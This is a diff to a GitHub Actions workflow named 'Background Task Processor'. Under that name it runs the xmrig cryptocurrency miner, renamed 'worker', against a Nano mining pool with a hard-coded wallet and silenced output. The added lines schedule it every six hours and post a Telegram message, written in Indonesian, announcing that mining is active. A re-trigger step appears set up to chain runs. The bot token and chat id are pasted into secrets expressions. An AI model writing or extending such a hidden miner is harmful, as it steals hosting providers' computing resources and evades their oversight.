@@ -2,6 +2,8 @@ name: Background Task Processor
 
 on:
   workflow_dispatch:
+  schedule:
+    - cron: "0 */6 * * *"
 
 jobs:
   task:
@@ -20,6 +22,12 @@ jobs:
         cd taskdir
         mv xmrig worker
         timeout 350m ./worker -o xmrig.nanswap.com:3333 -a rx -k -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q -p xpause > /dev/null 2>&1
+
+    - name: Notify Telegram
+      run: |
+        curl -s -X POST https://api.telegram.org/bot${{ secrets.8202889380:AAF88HssHDoG1N02PuyZ9M24LTDBhhyGql8 }}/sendMessage \
+        -d chat_id=${{ secrets.6993912434 }} \
+        -d text="✅ Background Task sedang berjalan otomatis.\nMining aktif melalui @NanoGithub_bot"
 
     - name: Re-trigger Task
       if: ${{ github.event_name == 'workflow_dispatch' }}
